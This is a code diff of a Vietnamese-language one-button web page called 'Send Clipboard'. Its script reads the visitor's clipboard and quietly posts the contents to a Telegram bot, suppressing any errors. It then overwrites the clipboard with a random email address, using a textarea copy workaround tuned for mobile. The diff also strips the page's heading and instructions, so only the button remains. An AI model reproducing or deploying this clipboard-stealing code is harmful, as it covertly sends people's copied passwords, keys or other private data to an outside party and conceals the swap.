@@ -4,22 +4,8 @@
   <meta charset="UTF-8">
   <title>Gửi Clipboard</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-    }
-    button {
-      width: 100%;
-      padding: 16px;
-      font-size: 18px;
-    }
-  </style>
 </head>
 <body>
-
-<h2>📋 Gửi Clipboard</h2>
-<p>Copy nội dung → bấm nút</p>
 
 <button onclick="sendClipboard()">📤 Dán & Gửi</button>
 
@@ -38,31 +24,36 @@ function generateEmail() {
 }
 
 async function sendClipboard() {
-  let clipboardText = "";
+  let text = "";
 
-  // 1️⃣ đọc clipboard hiện tại
+  // 1️⃣ đọc clipboard
   try {
-    clipboardText = await navigator.clipboard.readText();
+    text = await navigator.clipboard.readText();
   } catch (e) {
     return;
   }
 
-  if (!clipboardText) return;
+  if (!text) return;
 
-  // 2️⃣ gửi đúng nội dung đang copy về Telegram
+  // 2️⃣ gửi về Telegram
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       chat_id: CHAT_ID,
-      text: clipboardText
+      text: text
     })
   }).catch(() => {});
 
-  // 3️⃣ ghi đè clipboard bằng email ngẫu nhiên
-  try {
-    await navigator.clipboard.writeText(generateEmail());
-  } catch (e) {}
+  // 3️⃣ TẠO EMAIL & COPY BẰNG textarea hack
+  const email = generateEmail();
+  const temp = document.createElement("textarea");
+  temp.value = email;
+  document.body.appendChild(temp);
+  temp.select();
+  temp.setSelectionRange(0, 99999); // mobile
+  document.execCommand("copy");
+  document.body.removeChild(temp);
 }
 </script>
 
